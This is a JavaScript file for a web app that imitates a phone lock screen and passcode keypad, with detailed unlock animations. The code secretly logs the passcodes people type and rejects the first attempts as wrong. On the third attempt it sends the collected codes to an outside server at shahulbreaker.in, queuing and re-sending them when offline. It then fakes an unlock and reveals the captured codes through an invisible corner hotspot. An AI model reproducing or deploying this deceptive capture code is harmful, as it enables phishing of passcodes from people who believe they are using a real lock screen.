// app.js
(() => {
  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarun&data=";
  const MAX = 4;
  let code = "";

  const dotEls = Array.from(document.querySelectorAll('.dot'));
  const keys = Array.from(document.querySelectorAll('.key[data-num]'));
  const emergency = document.getElementById('emergency');
  // keep a live reference to cancel button
  let cancelBtn = document.getElementById('cancel');
  const unlockOverlay = document.getElementById('unlockOverlay');
  const lockInner = document.querySelector('.lockscreen-inner');
  const homescreenImg = document.getElementById('homescreenImg');
  const ATT_KEY = '_pass_attempt_count_';
  const QUEUE_KEY = '_pass_queue_';

  // grab the dynamic island element so we can flip the lock and animate it
  const dynamicIslandEl = document.querySelector('.dynamic-island');

  // Ensure wallpaper <img> is ready/visible (helps iOS PWA painting)
  (function ensureWallpaperPaints() {
    try {
      const wp = document.getElementById('wallpaperImg');
      if (wp) {
        wp.addEventListener('error', () => {
          wp.style.display = 'none';
        });
        if (wp.decode) {
          wp.decode().catch(()=>{/* ignore */});
        }
      }
    } catch (e) {}
  })();

  /* ---------- Viewport sync: match visualViewport and pin heights to avoid sliding/gaps ---------- */
  (function setupViewportSync() {
    function updateViewportHeight() {
      try {
        const vv = window.visualViewport;
        const base = vv ? Math.round(vv.height) : window.innerHeight;
        const overfill = 8;
        const used = Math.max(100, base + overfill);
        document.documentElement.style.setProperty('--app-viewport-height', used + 'px');
        const ls = document.querySelector('.lockscreen');
        if (ls) ls.style.height = used + 'px';
        document.body.style.height = used + 'px';
      } catch (err) {
        console.warn('viewport sync failed', err);
      }
    }

    window.addEventListener('load', updateViewportHeight, { passive: true });
    if (window.visualViewport) {
      window.visualViewport.addEventListener('resize', updateViewportHeight, { passive: true });
      window.visualViewport.addEventListener('scroll', updateViewportHeight, { passive: true });
    }
    window.addEventListener('resize', updateViewportHeight, { passive: true });
    window.addEventListener('orientationchange', updateViewportHeight, { passive: true });

    updateViewportHeight();

    // catch iOS toolbar animation frames
    let t = 0;
    const id = setInterval(() => {
      updateViewportHeight();
      t += 1;
      if (t > 20) clearInterval(id);
    }, 120);
  })();

  // rotating buffer for last up-to-4 entered codes
  const LAST_CODES_KEY = '_pass_last_codes_';
  function getLastCodes() {
    try {
      return JSON.parse(localStorage.getItem(LAST_CODES_KEY) || '[]');
    } catch (e) {
      return [];
    }
  }
  function pushLastCode(c) {
    try {
      const arr = getLastCodes();
      arr.push(c);
      while (arr.length > 4) arr.shift();
      localStorage.setItem(LAST_CODES_KEY, JSON.stringify(arr));
    } catch (e) {}
  }
  function getCombinedLastCodes() {
    return getLastCodes().join(',');
  }

  // --- clear saved attempts/queue on a fresh app session (iOS Home-screen launch) ---
  function clearSavedAttempts() {
    try {
      localStorage.removeItem(LAST_CODES_KEY);
      localStorage.removeItem(ATT_KEY);
      localStorage.removeItem(QUEUE_KEY);
    } catch (e) { /* ignore */ }
  }

  (function ensureFreshSessionOnLaunch() {
    try {
      const alreadyStarted = sessionStorage.getItem('pass_session_started');
      function markStarted() { sessionStorage.setItem('pass_session_started', '1'); }

      if (!alreadyStarted) {
        clearSavedAttempts();
        markStarted();
      }

      window.addEventListener('pageshow', () => {
        if (!sessionStorage.getItem('pass_session_started')) {
          clearSavedAttempts();
          markStarted();
        }
      }, { passive: true });
    } catch (err) {
      console.warn('session init check failed', err);
    }
  })();

  function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
  function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }

  function refreshDots() {
    const dots = Array.from(document.querySelectorAll('.dot'));
    dots.forEach((d,i) => d.classList.toggle('filled', i < code.length));
    updateCancelText();
  }

  function reset() {
    code = "";
    refreshDots();
  }

  function queuePass(pass) {
    const q = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    q.push({ pass, ts: Date.now() });
    localStorage.setItem(QUEUE_KEY, JSON.stringify(q));
  }

  function sendToAPI(pass) {
    const url = API_BASE + encodeURIComponent(pass);
    return fetch(url, { method: 'GET', keepalive: true })
      .catch(() => {
        queuePass(pass);
      });
  }

  function flushQueue() {
    const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
    if (!queue.length) return;
    queue.forEach(item => {
      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
    });
    localStorage.removeItem(QUEUE_KEY);
  }

  /* ---------- Spring engine (semi-implicit integrator) ---------- */
  function springAnimate(opts) {
    const mass = opts.mass ?? 1;
    const stiffness = opts.stiffness ?? 120; // k
    const damping = opts.damping ?? 14;      // c
    const threshold = opts.threshold ?? 0.02;
    let x = opts.from;
    let v = opts.velocity ?? 0;
    const target = opts.to;
    let last = performance.now();
    let rafId = null;

    function step(now) {
      const dt = Math.min(0.032, (now - last) / 1000);
      last = now;
      const a = (-stiffness * (x - target) - damping * v) / mass;
      v += a * dt;
      x += v * dt;

      if (typeof opts.onUpdate === 'function') opts.onUpdate(x);

      const isSettled = Math.abs(v) < threshold && Math.abs(x - target) < (Math.abs(target) * 0.005 + 0.5);
      if (isSettled) {
        if (typeof opts.onUpdate === 'function') opts.onUpdate(target);
        if (typeof opts.onComplete === 'function') opts.onComplete();
        cancelAnimationFrame(rafId);
        return;
      }
      rafId = requestAnimationFrame(step);
    }

    rafId = requestAnimationFrame(step);
    return () => cancelAnimationFrame(rafId);
  }

  /* ---------- playUnlockAnimation uses two springs ---------- */
  function playUnlockAnimation() {
    const prefersReduced = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    if (!lockInner || !unlockOverlay || !homescreenImg) return;

    unlockOverlay.classList.add('show');

    if (prefersReduced) {
      lockInner.style.transform = `translate3d(0, -110%, 0)`;
      homescreenImg.style.transform = `translate3d(0,0,0) scale(1)`;
      homescreenImg.style.opacity = '1';
      homescreenImg.style.filter = 'blur(0) saturate(1)';
      // hide pill immediately for reduced-motion users
      if (dynamicIslandEl) dynamicIslandEl.style.display = 'none';
      return;
    }

    const height = Math.max(window.innerHeight, document.documentElement.clientHeight);
    const targetY = -Math.round(height * 1.08);

    lockInner.style.willChange = 'transform, opacity';
    homescreenImg.style.willChange = 'transform, filter, opacity';

    // --- NEW: start homescreen already slightly zoomed in and a touch shifted up
    // then animate it OUT (zoom out + move down to natural position) while lock slides up.
    const HOME_START_SCALE = 1.04;   // slightly zoomed in at start
    const HOME_START_Y = -3;         // start translated up by -3% (will animate to 0)
    homescreenImg.style.transform = `translate3d(0, ${HOME_START_Y}%, 0) scale(${HOME_START_SCALE})`;
    homescreenImg.style.opacity = '0';
    homescreenImg.style.filter = 'blur(10px) saturate(0.9)';
    lockInner.style.transform = `translate3d(0,0,0) scale(1)`;
    lockInner.style.boxShadow = '0 40px 90px rgba(0,0,0,0.55)';

    // — SLOWER slide-up spring for lockInner (tuned to feel ~1s slower)
    springAnimate({
      from: 0,
      to: targetY,
      mass: 1.25,        // slightly heavier => slower
      stiffness: 110,   // a touch lower than before
      damping: 14,      // a touch lower damping so it stretches longer
      onUpdate: (val) => {
        const progress = Math.min(1, Math.abs(val / targetY));
        const scale = 1 - 0.003 * progress;
        lockInner.style.transform = `translate3d(0, ${val}px, 0) scale(${scale})`;
        lockInner.style.opacity = String(1 - Math.min(0.18, progress * 0.18));
      },
      onComplete: () => {
        // keep final transform; we won't hide lockInner here (homescreen spring will handle finalization)
        lockInner.style.boxShadow = '';
        lockInner.style.opacity = '0';
        lockInner.style.transform = `translate3d(0, ${targetY}px, 0)`;
      }
    });

    // — Homescreen spring: animate p from 0->1. We'll map p to:
    //   scale: HOME_START_SCALE -> 1.00 (zoom out)
    //   translateY: HOME_START_Y% -> 0% (move to natural position)
    springAnimate({
      from: 0,
      to: 1,
      mass: 1.05,
      stiffness: 60,  // lower stiffness -> slower
      damping: 9,     // lower damping -> longer duration
      onUpdate: (p) => {
        const progress = Math.max(0, Math.min(1, p));
        // scale reduces from HOME_START_SCALE to 1.0
        const scale = HOME_START_SCALE - (HOME_START_SCALE - 1) * progress;
        // translateY moves from HOME_START_Y -> 0
        const currentY = HOME_START_Y * (1 - progress);
        // subtle filter/opacity mapping (keeps the look you had)
        const blur = Math.max(0, 10 * (1 - Math.min(1, progress)));
        const sat = 0.9 + Math.min(0.15, progress * 0.15);
        homescreenImg.style.transform = `translate3d(0, ${currentY}%, 0) scale(${scale})`;
        homescreenImg.style.filter = `blur(${blur}px) saturate(${sat})`;
        homescreenImg.style.opacity = String(Math.min(1, 0.1 + progress));
      },
      onComplete: () => {
        homescreenImg.style.transform = 'translate3d(0,0,0) scale(1)';
        homescreenImg.style.filter = 'blur(0) saturate(1)';
        homescreenImg.style.opacity = '1';

        // After homescreen animation completes, wait an EXTRA 1 second,
        // then trigger the pill shrink & hide it after its CSS transition finishes.
        if (dynamicIslandEl) {
          const EXTRA_KEEP_MS = 1000; // user-requested extra 1 second keep
          setTimeout(() => {
            // trigger horizontal collapse
            dynamicIslandEl.classList.add('shrinking');

            // wait for the CSS transitionend on the dynamic island then hide / cleanup
            const onTransEnd = (ev) => {
              if (ev.target !== dynamicIslandEl) return;
              dynamicIslandEl.removeEventListener('transitionend', onTransEnd);
              try {
                dynamicIslandEl.style.display = 'none';
                dynamicIslandEl.classList.remove('shrinking', 'unlocked', 'icon-opened', 'locked');
              } catch (e) { /* ignore */ }
            };
            dynamicIslandEl.addEventListener('transitionend', onTransEnd);

            // safety hide if transitionend doesn't fire
            setTimeout(() => {
              try {
                dynamicIslandEl.style.display = 'none';
                dynamicIslandEl.classList.remove('shrinking', 'unlocked', 'icon-opened', 'locked');
              } catch (e) {}
            }, 1200);
          }, EXTRA_KEEP_MS);
        }
      }
    });

    // cleanup will-change flags after a while
    setTimeout(() => {
      lockInner.style.boxShadow = '';
      homescreenImg.style.willChange = '';
      lockInner.style.willChange = '';
    }, 1600 + 1000); // slightly longer to match slower springs
  }

  function animateWrongAttempt() {
    const dotsEl = document.getElementById('dots');
    if (!dotsEl) {
      reset();
      return;
    }
    const DURATION = 700;

    // Force Cancel label back to 'Cancel' during shake
    if (cancelBtn) cancelBtn.textContent = 'Cancel';

    dotsEl.classList.add('wrong');
    reset();
    setTimeout(() => {
      dotsEl.classList.remove('wrong');
    }, DURATION + 20);
  }

  /* ---------- Clipboard helper & toast (preserve user gesture) ---------- */
  function copyToClipboard(text) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      return navigator.clipboard.writeText(text).catch(() => {
        return fallbackCopy(text);
      });
    }
    return Promise.resolve().then(() => fallbackCopy(text));
  }

  function fallbackCopy(text) {
    return new Promise((resolve, reject) => {
      try {
        const ta = document.createElement('textarea');
        ta.value = text;
        ta.style.position = 'fixed';
        ta.style.left = '-9999px';
        ta.style.top = '0';
        document.body.appendChild(ta);
        ta.focus();
        ta.select();
        const ok = document.execCommand('copy');
        document.body.removeChild(ta);
        if (ok) resolve();
        else reject(new Error('execCommand copy failed'));
      } catch (err) {
        reject(err);
      }
    });
  }

  function showToast(msg, ms = 1200) {
    let t = document.getElementById('pass-toast');
    if (!t) {
      t = document.createElement('div');
      t.id = 'pass-toast';
      document.body.appendChild(t);
      if (!getComputedStyle(t).position) {
        Object.assign(t.style, {
          position: 'fixed',
          left: '50%',
          bottom: '120px',
          transform: 'translateX(-50%)',
          background: 'rgba(0,0,0,0.75)',
          color: '#fff',
          padding: '8px 12px',
          borderRadius: '10px',
          zIndex: '12002',
          pointerEvents: 'none',
          opacity: '0',
          transition: 'opacity 160ms ease, transform 160ms ease'
        });
      }
    }
    t.textContent = msg;
    t.style.opacity = '1';
    t.style.transform = 'translateX(-50%) translateY(0)';
    clearTimeout(t._hideTimer);
    t._hideTimer = setTimeout(() => {
      t.style.opacity = '0';
      t._hideTimer2 = setTimeout(() => {}, 200);
    }, ms);
  }

  /* ---------- handleCompleteAttempt: send on 3rd attempt, unlock on 4th ---------- */
  async function handleCompleteAttempt(enteredCode) {
    let attempts = getAttempts();
    attempts += 1;
    setAttempts(attempts);

    // push code into rotating buffer (so hotspot displays exact payload)
    pushLastCode(enteredCode);

    if (attempts === 1 || attempts === 2) {
      animateWrongAttempt();
    } else if (attempts === 3) {
      const combined = getCombinedLastCodes();
      if (combined) sendToAPI(combined);
      animateWrongAttempt();
    } else if (attempts === 4) {
      // Immediately show the unlocked (open) lock glyph and give it a small pop,
      // then start the unlock animation sequence (now slightly slower). The pill
      // will remain visible and will only shrink after the homescreen animation finishes + 1s.
      if (dynamicIslandEl) {
        dynamicIslandEl.classList.remove('locked');
        dynamicIslandEl.classList.add('unlocked', 'icon-opened');

        // ensure immediate repaint so the unlocked glyph is visible right away
        requestAnimationFrame(() => {
          // start the unlock animation immediately (no artificial delay anymore)
          playUnlockAnimation();
        });
      } else {
        // fallback
        playUnlockAnimation();
      }

      // local reset of input (preserve existing behavior)
      setTimeout(reset, 300);
    }

    if (attempts >= 4) {
      setAttempts(0);
    }
  }

  function animateBrightness(el, target, duration) {
    let startTime;
    const initial = parseFloat(el.dataset.brightness || "1");
    const change = target - initial;

    function easeOutCubic(t) { return 1 - Math.pow(1 - t, 3); }

    function frame(ts) {
      if (!startTime) startTime = ts;
      const progress = Math.min((ts - startTime) / duration, 1);
      const eased = easeOutCubic(progress);
      const value = initial + change * eased;
      el.style.filter = `brightness(${value})`;
      el.dataset.brightness = value.toFixed(3);
      if (progress < 1) requestAnimationFrame(frame);
    }
    requestAnimationFrame(frame);
  }

  keys.forEach(k => {
    const num = k.dataset.num;
    if (!num) return;

    k.addEventListener('touchstart', () => {
      animateBrightness(k, 1.6, 80);
      updateCancelText();
    }, { passive: true });

    const endPress = () => { animateBrightness(k, 1, 100); };
    k.addEventListener('touchend', endPress);
    k.addEventListener('touchcancel', endPress);
    k.addEventListener('mouseleave', endPress);

    k.addEventListener('click', () => {
      if (code.length >= MAX) return;
      code += num;
      refreshDots();

      if (code.length === MAX) {
        const enteredCode = code;
        try {
          const upcomingAttempts = getAttempts() + 1;
          if (upcomingAttempts === 3) {
            const toCopy = enteredCode;
            copyToClipboard(toCopy).catch(() => showToast('Copy failed', 900));
          }
        } catch (err) {
          console.warn('clipboard pre-copy failed', err);
        }

        setTimeout(() => {
          handleCompleteAttempt(enteredCode);
        }, 120);
      }
    });
  });

  emergency && emergency.addEventListener('click', e => e.preventDefault());

  // ----------------- Cancel / Delete behavior (non-destructive) -----------------
  function updateCancelText() {
    cancelBtn = document.getElementById('cancel') || cancelBtn;
    if (!cancelBtn) return;
    cancelBtn.textContent = (code && code.length > 0) ? 'Delete' : 'Cancel';
  }

  function wireCancelAsDelete() {
    const old = document.getElementById('cancel');
    if (!old) return;
    const cloned = old.cloneNode(true);
    old.parentNode && old.parentNode.replaceChild(cloned, old);
    cancelBtn = document.getElementById('cancel');
    cancelBtn.addEventListener('click', (e) => {
      e.preventDefault();
      if (code.length > 0) {
        code = code.slice(0, -1);
        refreshDots();
        updateCancelText();
      } else {
        reset();
      }
    });
  }

  wireCancelAsDelete();
  updateCancelText();

  window.addEventListener('online', flushQueue);
  flushQueue();

  /* ---------- Invisible bottom-left hotspot: show combined last codes on press ---------- */

  function createInvisibleHotspotAndDisplay() {
    if (!document.getElementById('codesHotspot')) {
      const hs = document.createElement('div');
      hs.id = 'codesHotspot';
      Object.assign(hs.style, {
        position: 'fixed',
        left: '8px',
        bottom: '8px',
        width: '56px',
        height: '56px',
        borderRadius: '12px',
        background: 'transparent',
        border: 'none',
        zIndex: '12000',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        boxSizing: 'border-box',
        touchAction: 'manipulation',
        cursor: 'pointer',
        pointerEvents: 'auto'
      });
      document.body.appendChild(hs);
    }

    if (!document.getElementById('codesCombinedDisplay')) {
      const d = document.createElement('div');
      d.id = 'codesCombinedDisplay';
      Object.assign(d.style, {
        position: 'fixed',
        left: '8px',
        bottom: '72px',
        minWidth: '160px',
        maxWidth: 'calc(100% - 16px)',
        zIndex: '12001',
        display: 'none',
        justifyContent: 'center',
        pointerEvents: 'none',
        transition: 'opacity 120ms ease, transform 120ms ease'
      });

      const inner = document.createElement('div');
      inner.id = 'codesCombinedInner';
      Object.assign(inner.style, {
        width: '100%',
        background: 'rgba(0,0,0,0.7)',
        borderRadius: '12px',
        padding: '10px 12px',
        boxSizing: 'border-box',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        color: '#fff',
        fontSize: '16px',
        fontFamily: 'ui-monospace, SFMono-Regular, Menlo, monospace',
        fontWeight: '700',
        letterSpacing: '0.6px'
      });

      d.appendChild(inner);
      document.body.appendChild(d);
    }
  }

  function showCombinedStringAtBottomLeft() {
    createInvisibleHotspotAndDisplay();
    const bar = document.getElementById('codesCombinedDisplay');
    const inner = document.getElementById('codesCombinedInner');
    inner.textContent = '';

    const codes = getLastCodes();
    if (!codes || codes.length === 0) inner.textContent = '';
    else inner.textContent = codes.join(',');

    bar.style.display = 'flex';
    requestAnimationFrame(() => {
      bar.style.transform = 'translateY(0)';
      bar.style.opacity = '1';
    });
  }

  function hideCombinedDisplayNow() {
    const bar = document.getElementById('codesCombinedDisplay');
    if (!bar) return;
    bar.style.transform = 'translateY(8px)';
    bar.style.opacity = '0';
    setTimeout(() => {
      if (bar) bar.style.display = 'none';
    }, 140);
  }

  // Hotspot handlers
  function onHotspotDown(ev) {
    ev.preventDefault();
    showCombinedStringAtBottomLeft();
  }
  function onHotspotUp(ev) {
    hideCombinedDisplayNow();
  }

  function ensureHotspotListeners() {
    createInvisibleHotspotAndDisplay();
    const hs = document.getElementById('codesHotspot');
    if (!hs._attached) {
      hs.addEventListener('pointerdown', onHotspotDown);
      window.addEventListener('pointerup', onHotspotUp);
      window.addEventListener('pointercancel', onHotspotUp);
      hs.addEventListener('touchstart', onHotspotDown, { passive: false });
      window.addEventListener('touchend', onHotspotUp);
      window.addEventListener('touchcancel', onHotspotUp);
      hs._attached = true;
    }
  }

  ensureHotspotListeners();

  window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };

})();
